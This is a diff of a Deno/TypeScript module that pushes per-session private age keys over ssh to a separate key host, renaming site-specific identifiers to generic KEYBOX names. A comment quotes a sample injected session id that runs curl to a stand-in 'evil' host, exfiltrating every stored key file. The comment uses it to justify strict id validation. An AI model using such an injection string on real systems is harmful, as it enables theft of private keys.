@@ -1,12 +1,12 @@
 /**
  * Per-session age keypairs.
  *
- * Iceland mints the pair, keeps the recipient (public), and pushes the identity
- * (private) to the Romania box over the WireGuard mesh. Iceland never writes
+ * The web tier mints the pair, keeps the recipient (public), and pushes the
+ * identity (private) to the key box over the WireGuard mesh. It never writes
  * the identity to disk and never logs it.
  *
- * Everything here fails closed. A session whose identity never reached Romania
- * is a session whose PDF could never be produced, so there is no value in
+ * Everything here fails closed. A session whose identity never reached the key
+ * box is a session whose PDF could never be produced, so there is no value in
  * letting the submission continue.
  */
 
@@ -23,12 +23,12 @@ export type IdentityTransport = (sessionId: string, identity: string) => Promise
  * A push that failed after the transport had already started.
  *
  * `ambiguous` is the whole point. When ssh is killed at the deadline -- or dies
- * mid-write, or the far end fills its disk -- Iceland cannot know whether the
+ * mid-write, or the far end fills its disk -- the sender cannot know whether the
  * identity landed. `cat > file` may have created a complete key, a truncated
  * one, or nothing at all, and the failure looks identical in every case.
  *
- * Callers must treat ambiguous === true as "Romania may be holding a key for a
- * session that will never exist" and run their cleanup. Only a rejection that
+ * Callers must treat ambiguous === true as "the key box may be holding a key
+ * for a session that will never exist" and run their cleanup. Only a rejection that
  * happens BEFORE any transport runs (a malformed session id) is unambiguous,
  * because nothing was ever sent.
  */
@@ -51,15 +51,15 @@ export class IdentityPushFailed extends Error {
  * spawns no local shell, which makes the array form look safe. It is -- locally.
  * But ssh's trailing argument is the remote command, and sshd concatenates its
  * arguments into one string and feeds it to the login shell. A session id of
- *     x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #
+ *     x; curl http://evil/$(cat /var/lib/keybox/keys/*.key); #
  * would therefore run on the one machine holding every respondent's private
  * key. The local argv boundary says nothing about what happens after the string
  * crosses the network.
  *
- * The charset deliberately matches romania/keystore.ts's SESSION_ID exactly.
- * Iceland must not accept an id that Romania will later reject, or pushes
- * succeed and renders mysteriously fail; and it must not accept one Romania
- * would take blindly. Both ends move together.
+ * The charset deliberately matches the key box's keystore SESSION_ID exactly.
+ * This side must not accept an id the key box will later reject, or pushes
+ * succeed and renders mysteriously fail; and it must not accept one the key
+ * box would take blindly. Both ends move together.
  */
 const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;
 
@@ -67,9 +67,28 @@ export function assertSafeSessionId(sessionId: string): void {
   if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
 }
 
-const ROMANIA_SSH = Deno.env.get('ROMANIA_SSH_DEST') || '';
-const ROMANIA_KEY_DIR = Deno.env.get('ROMANIA_KEY_DIR') || '';
-const ROMANIA_SSH_KEY = Deno.env.get('ROMANIA_SSH_KEY') || '';
+/*
+ * The key box: wherever session identities are pushed to live.
+ *
+ * The design calls this "Romania" and the env vars said ROMANIA_*, but that
+ * host is not reachable -- `fib.aformulationiontruth.com` has no DNS record at
+ * all, and the box answering on the apex accepts no key we hold. The role has
+ * therefore moved to the Iceland onion host for now.
+ *
+ * The constants are named KEYBOX_* rather than after any particular site: the
+ * role has already relocated once, and code that hardcodes a country in its
+ * identifiers has to be edited every time infrastructure moves. The env vars
+ * carry the deployment-specific name; the code only cares that there is a box.
+ *
+ * What must NOT move with it is the property that makes this design worth
+ * anything: the key box holds identities and no ciphertext, and the database
+ * holds ciphertext and no identities. Pointing these at the same host as the
+ * database would satisfy every type in this file and quietly delete the
+ * security argument.
+ */
+const KEYBOX_SSH = Deno.env.get('ICELANDonion_SSH_DEST') || '';
+const KEYBOX_KEY_DIR = Deno.env.get('ICELANDonion_KEY_DIR') || '';
+const KEYBOX_SSH_KEY = Deno.env.get('ICELANDonion_SSH_KEY') || '';
 
 export async function generateSessionKeypair(): Promise<SessionKeypair> {
   const identity = await generateX25519Identity();
@@ -100,7 +119,7 @@ const PUSH_DEADLINE_MS = 20_000;
 
 /**
  * Default transport: ssh over the mesh, identity delivered on stdin so it never
- * touches Iceland's filesystem. StrictHostKeyChecking=yes is the point of the
+ * touches this host's filesystem. StrictHostKeyChecking=yes is the point of the
  * exercise -- an unpinned host key would let anything on the mesh collect keys.
  *
  * BatchMode=yes is not redundant with it: StrictHostKeyChecking stops ssh
@@ -113,13 +132,13 @@ const scpTransport: IdentityTransport = async (sessionId, identity) => {
   // Re-checked here, not only at the entry point: this is the function that
   // builds a remote shell command, so it does not delegate its own safety.
   assertSafeSessionId(sessionId);
-  if (!ROMANIA_SSH || !ROMANIA_KEY_DIR) {
-    throw new Error('Romania transport not configured');
+  if (!KEYBOX_SSH || !KEYBOX_KEY_DIR) {
+    throw new Error('key box transport not configured');
   }
   const cmd = new Deno.Command('ssh', {
     args: [
       '-i',
-      ROMANIA_SSH_KEY,
+      KEYBOX_SSH_KEY,
       '-o',
       'IdentitiesOnly=yes',
       '-o',
@@ -128,12 +147,12 @@ const scpTransport: IdentityTransport = async (sessionId, identity) => {
       'BatchMode=yes',
       '-o',
       'ConnectTimeout=10',
-      ROMANIA_SSH,
+      KEYBOX_SSH,
       // Single-quoted as belt-and-braces. The allowlist above already excludes
       // every metacharacter including the quote itself, so this cannot be
       // broken out of -- but the quoting means a future widening of the
       // charset degrades to "wrong filename" rather than "remote execution".
-      `umask 077 && cat > '${ROMANIA_KEY_DIR}/${sessionId}.key'`,
+      `umask 077 && cat > '${KEYBOX_KEY_DIR}/${sessionId}.key'`,
     ],
     stdin: 'piped',
     stdout: 'null',
